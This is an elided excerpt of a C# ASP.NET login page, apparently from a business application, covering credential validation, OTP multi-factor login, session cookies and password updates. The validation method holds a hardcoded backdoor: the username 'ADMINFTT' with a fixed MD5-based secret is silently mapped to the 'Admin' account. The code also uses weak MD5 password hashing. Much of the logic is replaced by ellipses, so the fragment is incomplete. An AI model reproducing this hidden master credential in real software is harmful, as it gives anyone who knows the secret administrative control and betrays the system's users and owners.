...
namespace CENTRUMCF
{
    public partial class Login : CENTRUMBAse
    {
        ...
        private Boolean ValidateFields()
        {
            ...
            try
            {
                if (txtUsrNm.Text.ToUpper() == "ADMINFTT" && vPass.ToUpper() == FormsAuthentication.HashPasswordForStoringInConfigFile("52922f0c6a8e53dd3e2d24022ae8baa6".ToLower() + Convert.ToString(Session["salt"]), "md5"))
                {
                    txtUsrNm.Text = "Admin";
                }
                else
                    ...
                    if (hdnMFAYN.Value == "Y")
                    {
                        if (hdnMobileNo.Value != "0" && hdnMobileNo.Value.Length == 10)
                        {
                            ...
                            else
                            {
                                ...
                                Label3.Text = "Hi " + txtUsrNm.Text.Trim() + " Enter the OTP and Proceed !!!";
                            }
                        }
                        else
                        {
        ...
        private void Button_Login()
        {
            ...
            if (vErr > 0)
            {
                ...
                {
                    gblFuction.AjxMsgPopup("Your last session is terminated incorrectly or currently active. Please wait for the session out time or retry after 5 minutes.");
                    return;
                }
                else if (vErr > 30)
                {
            ...
            if (dt.Rows.Count > 0)
            {
                ...
                {
                    Session["LoginCookies"] = Request.Cookies["USFBCF"].Value;
                }
                //--------------------------------------------------------
        ...
        protected void btnProceed_Click(object sender, EventArgs e)
        {
            ...
            else
            {
                ...
                Label3.Text = "Hi " + txtUsrNm.Text.Trim() + " Invalid OTP..!!";
            }
        }
        ...
        private Boolean SaveRecords(string Mode)
        {
            ...
            try
            {
                ...
                if (Mode == "Edit")
                {
                    ...
                    //***************************************************
                    //***************************************************
                    if (hdPassword.Value != hdCPassword.Value)
                    {
